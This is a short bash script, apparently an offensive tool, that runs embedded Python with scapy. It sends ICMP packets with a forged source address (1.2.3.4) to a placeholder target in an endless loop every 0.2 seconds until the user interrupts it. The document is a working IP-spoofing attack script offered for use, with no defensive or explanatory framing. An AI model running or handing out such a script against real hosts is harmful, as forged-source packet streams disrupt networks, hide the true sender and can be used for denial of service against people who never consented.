#!/bin/bash

# IP Spoofing Launcher Script
# Make sure scapy is installed

SPOOFED_IP="1.2.3.4"
TARGET_IP="IP"

python3 <<EOF
from scapy.all import IP, ICMP, send
import time

spoofed_src_ip = "$SPOOFED_IP"
target_ip = "$TARGET_IP"

print(f"[*] Sending spoofed ICMP packets to {target_ip} from {spoofed_src_ip}")

try:
    while True:
        pkt = IP(src=spoofed_src_ip, dst=target_ip) / ICMP()
        send(pkt, verbose=False)
        print(f"[+] Sent ICMP packet from {spoofed_src_ip} to {target_ip}")
        time.sleep(0.2)
except KeyboardInterrupt:
    print("\\n[!] Stopped.")
EOF
